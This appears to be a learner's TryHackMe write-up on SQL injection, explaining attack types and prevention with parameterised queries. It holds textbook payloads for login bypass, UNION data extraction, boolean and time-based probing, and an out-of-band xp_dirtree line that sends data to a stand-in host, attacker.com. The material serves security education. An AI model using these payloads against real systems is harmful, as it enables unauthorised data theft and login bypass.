# TryHackMe — SQL Injection

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Category](https://img.shields.io/badge/Category-Web%20Application-blue)
![Topic](https://img.shields.io/badge/Topic-SQL%20Injection-red)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | SQL Injection |
| Tasks Completed | Task 3 — Task 10 (all) |
| Focus | SQL Injection attack types and prevention |
| Date Completed | June 2026 |

---

## Tasks Completed

| Task | Topic | Status |
|------|-------|--------|
| Task 3 | What is SQL Injection? | ✅ Done |
| Task 4 | In-Band SQL Injection | ✅ Done |
| Task 5 | Blind SQLi: Authentication Bypass | ✅ Done |
| Task 6 | Blind SQLi: Boolean and Time-Based | ✅ Done |
| Task 7 | Out-of-Band SQL Injection | ✅ Done |
| Task 8 | Remediation and Prevention | ✅ Done |
| Task 9 | Practical: SQL Injection | ✅ Done |
| Task 10 | Conclusion | ✅ Done |

---

## What is SQL Injection?

SQL Injection occurs when user-supplied input is inserted directly into a SQL query without proper sanitisation or parameterisation. An attacker can manipulate the query logic to:

- Bypass authentication
- Extract data from the database
- Modify or delete records
- In some cases, execute OS-level commands

**Why it exists:** Developers concatenate user input directly into SQL strings instead of using prepared statements.

**Example of vulnerable code:**
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

If `$username` is set to `admin' --`, the query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```
The `--` comments out the password check — authentication bypassed.

---

## Task 4 — In-Band SQL Injection

In-Band SQLi is the most common type. The attacker uses the same channel to inject the payload and receive the results.

### Two subtypes:

**Error-Based SQLi**
- Deliberately triggers database errors that reveal information about the database structure
- Error messages expose table names, column names, and database version

**Union-Based SQLi**
- Uses the `UNION` SQL operator to append a second query to the original
- Returns data from other tables in the same HTTP response

**Key payload pattern:**
```sql
' UNION SELECT null, username, password FROM users --
```

**What I learned:** The number of columns in the UNION must match the original query. Use `ORDER BY` to count columns before attempting UNION attacks.

---

## Task 5 — Blind SQLi: Authentication Bypass

Blind SQLi occurs when the application does not return query results or error messages — you only see whether the query succeeded or failed.

**Authentication bypass technique:**
```sql
' OR 1=1 --
' OR 'x'='x
admin' --
```

The condition `1=1` is always true, so the WHERE clause returns all rows and the first user (often admin) is logged in.

**What I learned:** Even without visible output, SQL logic can be manipulated. Boolean conditions that are always true bypass authentication checks entirely.

---

## Task 6 — Blind SQLi: Boolean and Time-Based

### Boolean-Based Blind SQLi
- Send payloads that produce different application responses based on true/false conditions
- Extract data one bit at a time by observing response differences

```sql
' AND SUBSTRING(username,1,1)='a' --
```
If the page responds normally → first character is 'a'. Repeat for each character.

### Time-Based Blind SQLi
- No visible response difference — use database sleep functions to infer true/false
- If the page delays → condition was true

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5' --   -- MSSQL
' AND SLEEP(5) --                        -- MySQL
```

**What I learned:** Time-based SQLi is the slowest but works even when the application returns identical responses for true and false conditions. Tools like `sqlmap` automate this but manual understanding of the logic is essential.

---

## Task 7 — Out-of-Band SQL Injection

Out-of-Band SQLi uses a different channel to extract data — typically DNS or HTTP requests to an attacker-controlled server.

**When it's used:**
- In-band and blind techniques are too slow or unreliable
- The database server can make outbound network requests
- Requires specific database functions (`xp_dirtree`, `load_file`, `UTL_HTTP`)

**Example (MSSQL):**
```sql
'; exec master..xp_dirtree '//attacker.com/a' --
```

The DNS lookup to `attacker.com` confirms the injection and can carry data in the subdomain.

**What I learned:** Out-of-Band SQLi depends heavily on the database type and server configuration. It is less common in practice but important to understand for advanced engagements.

---

## Task 8 — Remediation and Prevention

### How to prevent SQL Injection:

| Defence | How it works |
|---------|-------------|
| **Prepared statements** | Query structure defined before input is added — input can never change the query logic |
| **Parameterised queries** | User input treated as data, not SQL syntax |
| **Input validation** | Whitelist expected input formats, reject everything else |
| **Stored procedures** | Pre-compiled SQL that limits what can be executed |
| **WAF (Web Application Firewall)** | Detects and blocks common SQLi patterns |
| **Least privilege** | DB user should only have permissions it actually needs |
| **Error handling** | Never expose raw database error messages to users |

**Secure code example (Python):**
```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

Input is passed as a parameter — the query structure cannot be changed regardless of what the user enters.

---

## Task 9 — Practical: SQL Injection

Applied all techniques from tasks 3–8 against a live vulnerable target within TryHackMe's environment.

Steps taken:
1. Identified the injectable parameter through manual testing
2. Determined injection type (in-band / blind) based on application response
3. Enumerated database structure using UNION-based technique
4. Extracted target data from the database
5. Documented exact payloads and responses

---

## Key Takeaways from This Room

- SQL Injection is consistently ranked in the OWASP Top 10 because it remains extremely common despite being entirely preventable
- The attack type (in-band, blind, out-of-band) is determined by what the application reveals in its response — adapt technique to the target, not the other way around
- Manual understanding of SQLi is essential — automated tools like sqlmap are faster but blind use of them without understanding the underlying logic fails in real engagements
- Prevention is simple: parameterised queries eliminate SQLi entirely — the fact that SQLi still exists in 2026 is a developer education problem
- This room directly maps to PortSwigger Web Security Academy SQLi labs where the same techniques are practiced in isolated lab environments

---

## Connection to PortSwigger Labs

| TryHackMe Task | PortSwigger Equivalent Lab |
|---------------|--------------------------|
| In-Band SQLi | Lab: SQL injection UNION attack, retrieving data from other tables |
| Auth Bypass | Lab: SQL injection vulnerability allowing login bypass |
| Boolean Blind | Lab: Blind SQL injection with conditional responses |
| Time-Based Blind | Lab: Blind SQL injection with time delays |

---

## Resources

- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [OWASP SQLi Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## My Progress

- [x] Guided Pentest: Web Application
- [x] Guided Pentest: Infrastructure
- [x] SQL Injection ← *this writeup*
- [ ] Cross-Site Scripting (XSS)
- [ ] Authentication vulnerabilities
- [ ] TryHackMe Jr Penetration Tester path

---

*Part of my 6-month cybersecurity portfolio — [github.com/your-username](https://github.com/your-username)*
